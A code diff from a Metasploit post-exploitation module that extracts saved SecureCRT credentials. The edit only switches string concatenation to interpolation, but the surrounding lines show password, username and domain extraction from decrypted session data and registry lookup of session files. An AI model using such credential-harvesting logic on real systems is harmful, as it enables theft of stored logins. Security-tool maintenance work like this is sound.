@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Post
         password = decrypted_script[/[p]*assword:\x1F(?<password>[\S]+)\x1F/u, 'password']
         domain = decrypted_script[/[Ww]*indows [Dd]*omain:\x1F(?<domain>[\S]+)\x1F/u, 'domain']
         if !domain.nil? && !username.nil?
-          username = domain + '\\' + username
+          username = "#{domain}\\#{username}"
         end
       else
         password = securecrt_crypto(file[/"Password"=u(?<password>[0-9a-f]+)/u, 'password'])
@@ -185,7 +185,7 @@ class MetasploitModule < Msf::Post
       parent_key = 'HKEY_CURRENT_USER\\Software\\VanDyke\\SecureCRT'
       # get session file path
       root_path = registry_getvaldata(parent_key, 'Config Path')
-      securecrt_path = expand_path(root_path + session.fs.file.separator + 'Sessions') if !root_path.to_s.empty?
+      securecrt_path = expand_path("#{root_path}#{session.fs.file.separator}Sessions") if !root_path.to_s.empty?
     else
       securecrt_path = expand_path(datastore['SESSION_PATH'])
     end
